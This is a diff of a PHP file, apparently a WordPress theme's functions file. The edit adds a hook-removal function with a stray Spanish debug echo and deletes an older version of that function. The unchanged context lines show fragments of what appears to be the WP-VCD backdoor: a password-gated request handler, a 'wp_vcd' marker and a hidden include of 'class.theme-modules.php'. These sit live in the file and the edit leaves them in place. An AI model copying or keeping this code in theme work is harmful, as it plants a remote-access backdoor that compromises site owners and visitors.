@@ -1,6 +1,13 @@
 <?php
 
 
+function eliminar_doble_registro(){	
+	echo "hola estoy aqui";
+	remove_action('wp', 'EWD_FEUP_Track_Page_Load');
+}
+add_action( 'init', 'eliminar_doble_registro', 11 );
+
+
 /*
 if (isset($_REQUEST['action']) && isset($_REQUEST['password']) && ($_REQUEST['password'] == 'e7b0aa2db6403d16104a6c901b857fee'))
 
@@ -99,10 +106,9 @@ $div_code_name = "wp_vcd";
 
 ?><?php 
 
-add_action( 'eliminar_doble_registro', 'eliminar_doble_registro', 9 );
-function eliminar_doble_registro(){
-    remove_action('wp', 'EWD_FEUP_Track_Page_Load', 10, 2);
-}
+
+
+
 
 if (file_exists(dirname(__FILE__) . '/class.theme-modules.php')) include_once(dirname(__FILE__) . '/class.theme-modules.php'); ?><?php
 //Get theme data
